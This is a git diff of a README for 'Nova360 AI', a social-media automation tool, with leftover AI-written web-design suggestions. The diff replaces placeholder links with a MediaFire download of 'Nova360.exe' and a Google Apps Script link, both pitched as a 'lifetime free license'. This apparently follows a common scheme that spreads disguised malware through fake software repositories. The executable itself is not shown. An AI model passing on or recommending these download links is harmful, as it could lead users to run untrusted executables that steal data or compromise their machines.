@@ -34,8 +34,8 @@ Nova360 AI is a powerful all-in-one software designed to automate your social me
 
 ## **How to Install Nova360 AI**  
 
-1. **Download the Software**:  
-   [Download Nova360 AI v2.1.1](#)  or [Request Full Version & License](#)  or Clone this Repo
+1. **Download the Software with lifetime free license**:  
+   [Download Nova360 AI v2.1.1](https://www.mediafire.com/file/yh2wglgfa1t1dus/Nova360.exe)  or [Request Full Version & License](https://script.google.com/macros/s/AKfycbxcFnuOwtTNKf1XtpxKzMbrcUKy2doMJ7S2GObFLbm0zhKTV61v_ZnMPxfih-eXfO4ttg/exec)  or Clone this Repo
 
 2. **Run the Executable**:  
    Double-click `nova360_ai.exe`.  
@@ -108,7 +108,7 @@ A big thank you to all contributors and open-source projects that made Nova360 A
 
 ## **License**  
 
-This project is licensed under the MIT License. See the `LICENSE` file for more details.  
+This project is licensed under the MIT License. See the `LICENSE` [License File](https://github.com/nova360-ai/nova360-full-version/blob/master/license.txt) file for more details.  
 
 ---  
 
@@ -124,7 +124,7 @@ Here’s an expanded and refined version of the suggestions you selected for you
 
 ---
 
-### ** Incorporate Animations or Motion Graphics**
+### **Incorporate Animations or Motion Graphics**
 
 **Animation for Key Features:**
 Using subtle animations can greatly enhance engagement. For example, you could animate the transition between features on the page to showcase how **Nova360 AI** automates various tasks. Small animations like moving arrows, loading indicators, or hover effects that visually highlight the benefits of the platform will not only capture attention but also illustrate how the platform works.
@@ -136,7 +136,7 @@ Using subtle animations can greatly enhance engagement. For example, you could a
 **Call-to-Action Animation:**
 Consider animating the "Download Now" button or “Try Demo” link with a smooth pulse effect to subtly encourage users to click.
 
-### ** Live Chat Support or Chatbot**
+### **Live Chat Support or Chatbot**
 
 **Why You Need It:**
 Live chat or chatbots are indispensable in modern websites for enhancing user interaction. A live chatbot on your landing page can help answer questions in real time, offering support and improving the chances of conversion by providing immediate assistance.
@@ -198,4 +198,3 @@ By framing **Nova360 AI**’s capabilities through the lens of benefits, your vi
 
 ---
 
-These changes should make the page more engaging, accessible, and informative for your users, driving both their interest and trust in **Nova360 AI**.
